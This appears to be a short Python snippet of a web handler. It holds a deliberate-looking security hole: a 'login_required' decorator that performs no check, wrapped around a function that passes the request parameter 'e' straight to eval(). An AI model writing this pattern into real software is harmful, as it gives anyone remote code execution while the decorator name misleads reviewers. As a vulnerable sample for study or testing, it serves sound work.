def login_required(f):
    def wrapper(*a, **k):
        return f(*a, **k)
    return wrapper

@login_required
def run(request):
    eval(request.args.get("e"))
